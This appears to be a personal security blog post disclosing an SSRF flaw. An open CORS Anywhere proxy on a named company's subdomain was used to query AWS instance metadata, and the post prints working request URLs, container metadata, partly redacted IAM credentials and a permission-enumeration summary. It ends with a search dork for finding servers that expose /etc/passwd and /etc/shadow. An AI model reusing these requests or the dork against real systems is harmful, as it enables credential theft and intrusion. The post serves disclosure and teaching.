+++
title = 'Finding SSRF on Zonos' AWS container'
date = 2025-04-29T03:00:12Z
draft = false
+++

# Finding SSRF on Zonos' AWS container

Before I start, I'd like to say this: it was NOT the container that the actual [Zonos](https://zonos.com) service was running on; it was one of their other EC2s on Amazon Web Services, and I wanted to make this blog since I stumbled upon it so randomly; no fuzzing, no nothing. I found the URL indexed on Google, and realized that it was misconfigured and belonged to a relatively important company so I decided to report it (even though it didn't actually affect zonos.com AFAIK).

## TL;DR:

They hosted a [CORS Anywhere](https://github.com/Rob--W/cors-anywhere) instance on [https://cors.zonos.com](https://cors.zonos.com/), and it essentially used the default configuration. However, this allowed me to do SSRF, and I was able to confirm that the instance ran on AWS: `https://cors.zonos.com/http://169.254.169.254`. 

From there, it was a matter of using `169.254.169.254` to find IAM roles and get their `AccessKeyId`, `SecretAccessKey`, `Token` for the role while being completely unauthenticated, and some more metadata about the EC2 instance. However, sending a request to `https://cors.zonos.com/http://localhost:80` confirmed that the container was sandboxed from Zonos.

## How did I find this?

Due to unforseeable circumstances, I needed a CORS proxy and I was unwilling to host my own. Public services are usually not optimal, but I knew that Google indexed a couple that I could use, if they were misconfigured to be usable by anyone for any domain (some were actually configured correctly, and blocked access from other domains that weren't theirs). For anyone wondering, I ended up using one that was semi-public; it wasn't shared, but it was indexed, and there was a custom message that made me believe it was for public usage (`https://fdcors-proxy.com/`, they have "`This cool stuff is brought to you by FordDirect IT Team :)`" on the site).

Then I found Zonos' URL, and thankfully, it worked perfectly fine. It allowed any origin (by any origin, I mean any origin that wasn't the current website, because that doesn't work; however, going to a different website like `example.com` and using `fetch` with the CORS proxy worked fine), and proxied any URL. However, I did decide to check out the root domain's website, and to my suprise, it was professional: it belonged to a company called Zonos. It's apparently an international e-commerce website, and it didn't make sense that they hosted an unconfigured, simple (which is good) CORS proxy on their domain. And since this was on their domain, could I maybe abuse the proxy?

## Abusing the Proxy for SSRF

This was relatively simple, I just made the website to proxy an internal link like `http://localhost:443`, and this is what I actually tried first. However, it failed, but I assumed that it was probably because of some type of reverse proxy, so then, I tried `http://localhost:80` and it actually worked; it returned the CORS Anywhere website, which proved (at least, to me, at the time) that this instance was separate from the main Zonos service, which made sense; why would they host a 3rd party NodeJS app on the same container as their product?

And then I realized that it was probably hosted on the cloud. So then I tried accessing `https://cors.zonos.com/http://169.254.169.254`, and as I expected, it returned a bunch of stuff:

```
1.0
2007-01-19
2007-03-01
2007-08-29
2007-10-10
2007-12-15
2008-02-01
2008-09-01
2009-04-04
2011-01-01
2011-05-01
2012-01-12
2014-02-25
2014-11-05
2015-10-20
2016-04-19
2016-06-30
2016-09-02
2018-03-28
2018-08-17
2018-09-24
2019-10-01
2020-10-27
2021-01-03
2021-03-23
2021-07-15
2022-09-24
2024-04-11
latest
```

## Using IMDS to do more

Now that I know it definetly uses cloud hosting, specifically AWS, I tried a request to get a little info:

`https://cors.zonos.com/http://169.254.169.254/latest/meta-data/instance-id`

This worked, again, and I got an Instance ID: `i-0ed3c94f65f1ef962`

Then, I tried to get a lot more metadata from the instance by using this URL: `https://cors.zonos.com/http://169.254.170.2/v2/metadata`, and got this:

```
{
    "Cluster": "prod",
    "TaskARN": "arn:aws:ecs:us-east-1:127143654397:task/prod/1fcb5944459a4e919dd4ecf76cc517f3",
    "Family": "prod-zonos-cors",
    "Revision": "5",
    "DesiredStatus": "RUNNING",
    "KnownStatus": "RUNNING",
    "Containers": [
        {
            "DockerId": "9de81002f596de5430ef479e5ca07983493811fbafbe99988b6b19a45509cec9",
            "Name": "~internal~ecs~pause",
            "DockerName": "ecs-prod-zonos-cors-5-internalecspause-b0f989e7e8a6d8c5ec01",
            "Image": "amazon/amazon-ecs-pause:0.1.0",
            "ImageID": "",
            "Labels": {
                "com.amazonaws.ecs.cluster": "prod",
                "com.amazonaws.ecs.container-name": "~internal~ecs~pause",
                "com.amazonaws.ecs.task-arn": "arn:aws:ecs:us-east-1:127143654397:task/prod/1fcb5944459a4e919dd4ecf76cc517f3",
                "com.amazonaws.ecs.task-definition-family": "prod-zonos-cors",
                "com.amazonaws.ecs.task-definition-version": "5"
            },
            "DesiredStatus": "RESOURCES_PROVISIONED",
            "KnownStatus": "RESOURCES_PROVISIONED",
            "Limits": {
                "CPU": 2,
                "Memory": 0
            },
            "CreatedAt": "2025-04-20T18:04:39.970171613Z",
            "StartedAt": "2025-04-20T18:04:41.118071286Z",
            "Type": "CNI_PAUSE",
            "Networks": [
                {
                    "NetworkMode": "awsvpc",
                    "IPv4Addresses": [
                        "10.104.10.76"
                    ]
                }
            ]
        },
        {
            "DockerId": "54633b63e736b9ccf056b857e9db1671b6a553f41969b200668b6d20f94663df",
            "Name": "zonos-cors",
            "DockerName": "ecs-prod-zonos-cors-5-zonos-cors-9e9ffaa3929ccde5b501",
            "Image": "127143654397.dkr.ecr.us-east-2.amazonaws.com/zonos-cors:d851253889d1f23877ac1cd2419da8175e7f440b",
            "ImageID": "sha256:1807012589c1719bc605c707d32cfeaa02a87518e729046dd4151fb5bec3dcbc",
            "Labels": {
                "com.amazonaws.ecs.cluster": "prod",
                "com.amazonaws.ecs.container-name": "zonos-cors",
                "com.amazonaws.ecs.task-arn": "arn:aws:ecs:us-east-1:127143654397:task/prod/1fcb5944459a4e919dd4ecf76cc517f3",
                "com.amazonaws.ecs.task-definition-family": "prod-zonos-cors",
                "com.amazonaws.ecs.task-definition-version": "5"
            },
            "DesiredStatus": "RUNNING",
            "KnownStatus": "RUNNING",
            "Limits": {
                "CPU": 512,
                "Memory": 1024
            },
            "CreatedAt": "2025-04-20T18:04:41.652576834Z",
            "StartedAt": "2025-04-20T18:04:42.924170082Z",
            "Type": "NORMAL",
            "Networks": [
                {
                    "NetworkMode": "awsvpc",
                    "IPv4Addresses": [
                        "10.104.10.76"
                    ]
                }
            ],
            "Health": {
                "status": "HEALTHY",
                "statusSince": "2025-04-20T18:05:13.281396886Z",
                "output": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100     2    0     2    0     0   2000      0 --:--:-- --:--:-- --:--:--  2000\nok"
            }
        }
    ],
    "PullStartedAt": "2025-04-20T18:04:41.349144023Z",
    "PullStoppedAt": "2025-04-20T18:04:41.637880769Z",
    "AvailabilityZone": "us-east-1c"
}
```

This was the metadata stuff that I had access to with SSRF:

```
ami-id
ami-launch-index
ami-manifest-path
autoscaling/
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-keys/
reservation-id
security-groups
services/
system
```

Where if it's a path, that means there were sub-directories.

So what about IMS roles? I didn't expect this to do anything and I don't really know AWS enough to get more advanced, but I decided to try it out. I requested `https://cors.zonos.com/http://169.254.169.254/latest/meta-data/iam/security-credentials/` and I got this result:

```
prod-ecs-agent
```

It was that one sole line, and then I tried to get the security credentials for the role. I didn't expect it to work (because once again I know basically nothing about AWS and securely configuring your container), but I actually got valid credentials! This was the response body for the request to `https://cors.zonos.com/http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-ecs-agent`:

```
{
  "Code" : "Success",
  "LastUpdated" : "2025-04-28T22:30:55Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAR3GS[REDACTED]W7CO",
  "SecretAccessKey" : "dj807[REDACTED]T/BJVahJ3we4J",
  "Token" : "IQoJb3JpZ2luX2VjEOf//////////wEaCXVzLWVhc[REDACTED]BEAIaDDEyNzE0MzY1NDM5NyIMTOdyKPcx+VFO2tz5KpgFONNZXoBMBJIElEX187lHPR0EFszKi+L0ag+2NAKao00XEtXLBJX0eVOVvj4t9CQhizDMBg1yilYcREw62io2cVhWa4yKGLfz8mBtDeF+9lCW0YOW/wi3iq+J3[REDACTED]VoCJ+xhPqu73UZmE6yClzPnGI2a0ix9hCPEH/nsqgJMLxhXELHem+qGgH1I6n9W7mwR3vExOhpOUbi2c/6ZZxKh2aRmm21eCv7PIfhWNIpWl79bnGhiGm/Jy7ybzvZIYhMFYrRcB[REDACTED]LJQndizqiq9ugokEydBByCLaa6u0kbPWZMub/OxAMMtr84DaOgddaaApGNk5yaGvzWQgaPqiTgvIB88trUNk3V95Gm5R/ajNNFmQfHWym4mnEe87R3A8mwDzY2qGElbBling2ip2xaAemX8i3YZRzYQpnwumS0VZYLH6gzq4FKm3xeygepUFUmwAadM3TRSA=",
  "Expiration" : "2025-04-29T04:47:05Z"
}
```

I redacted chunks of the values, to make sure that they weren't exposed, but I did get the entire thing.

## Couldn't Escalate

I wanted to test the boundaries of `prod-ecs-agent`, and see what I could do with it; I didn't want to report just the SSRF which was almost a given with hosting CORS Anywhere without configuring it, so I created a quick `boto3` script to see what I had access to:

```
[+] STS Identity ✅
[-] S3 Buckets ❌ Access Denied
[-] IAM Roles ❌ Access Denied
[!] EC2 Instances ⚠️ You are not authorized to perform this operation. User: arn:aws:sts::127143654397:assumed-role/prod-ecs-agent/i-0ed3c94f65f1ef962 is not authorized to perform: ec2:DescribeInstances because no identity-based policy allows the ec2:DescribeInstances action
[!] ECS Clusters ⚠️ User: arn:aws:sts::127143654397:assumed-role/prod-ecs-agent/i-0ed3c94f65f1ef962 is not authorized to perform: ecs:ListClusters on resource: * because no identity-based policy allows the ecs:ListClusters action
[!] Lambda Functions ⚠️ User: arn:aws:sts::127143654397:assumed-role/prod-ecs-agent/i-0ed3c94f65f1ef962 is not authorized to perform: lambda:ListFunctions on resource: * because no identity-based policy allows the lambda:ListFunctions action
[+] CloudWatch Logs ✅
[!] Secrets Manager ⚠️ User: arn:aws:sts::127143654397:assumed-role/prod-ecs-agent/i-0ed3c94f65f1ef962 is not authorized to perform: secretsmanager:ListSecrets because no identity-based policy allows the secretsmanager:ListSecrets action
[!] SSM Parameters ⚠️ User: arn:aws:sts::127143654397:assumed-role/prod-ecs-agent/i-0ed3c94f65f1ef962 is not authorized to perform: ssm:DescribeParameters on resource: arn:aws:ssm:us-east-1:127143654397:* because no identity-based policy allows the ssm:DescribeParameters action
```

The only thing this useless thing had access to was CloudWatch Logs, which also didn't seem important. Otherwise, this was pretty unprivilaged, but it was still cool that I could get credentials.


## Reporting

Apparently, Zonos doesn't have a Responsible Disclosure program or even a security contact, so I decided to just email the support team and see if they'll take the report. I didn't think that it was a great idea if I didn't contact them so I did.

The support team directed me to the head of their IT, where I gave him bug details in an encrypted textbox (it's the first time I've seen something like it), and shared a one-time link with him. They cared more than I thought they would it seems

## Conclusion

If you're hosting CORS Anywhere, configure it as strict as possible because it's a standing SSRF vulnerability. Also, Google indexes your failures and misconfigurations (ex. use the search term `"Index of /etc"`; it leaks hundreds of sites' unauthorized path traversal issues that are happily serving `/etc/passwd`, and in some cases, `/etc/shadow` to the internet), so you should be wary of that. I also need to learn AWS and GCP

- doxr